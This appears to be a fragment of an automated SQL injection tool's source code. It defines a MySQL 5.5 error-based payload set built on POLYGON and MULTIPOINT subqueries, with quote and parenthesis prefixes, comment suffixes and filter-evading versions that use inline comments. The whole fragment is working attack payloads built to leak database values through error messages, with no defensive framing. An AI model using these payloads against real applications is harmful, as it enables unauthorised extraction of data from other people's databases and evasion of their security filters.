...
TITLE = "MySQL <= 5.5 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GEOMETRIC)"
## MySQL Injection Type AND MySQL Comments
PREFIXES, SUFIXES = (" ", "' ", '" ', ") ", "') "),("", "AND 1", "AND'", "--+-", "%23", "AND '1")

# Test Queries for extractvalue()
# "OR MULTIPOINT((SELECT*FROM(SELECT*FROM(SELECT CONCAT(0x7e, "+str(Str1)+")root)k)p))",
           # "OR POLYGON((SELECT*FROM(SELECT*FROM(SELECT CONCAT(0x7e, "+str(Str1)+")root)k)p))",
TESTS = ("AND POLYGON((SELECT*FROM(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44)root)k)p))",
         "AND POLYGON/**_**/((/*!50000SELECT*/*/*!50000FROM*/(/*!50000SELECT*/*/*!50000FROM*/(/*!50000SELECT*/ CONCAT/**_**/(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44)root)k)p))",
         "AND MULTIPOINT((SELECT*FROM(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,"+str(Str1)+",0x7e454e44)root)k)p))",
         "AND MULTIPOINT/**_**/((/*!50000SELECT*/*/*!50000FROM*/(/*!50000SELECT*/*/*!50000FROM*/(/*!50000SELECT*/ CONCAT/**_**/(0x496e6a65637465647e, "+str(Str1)+",0x7e454e44)root)k)p))")
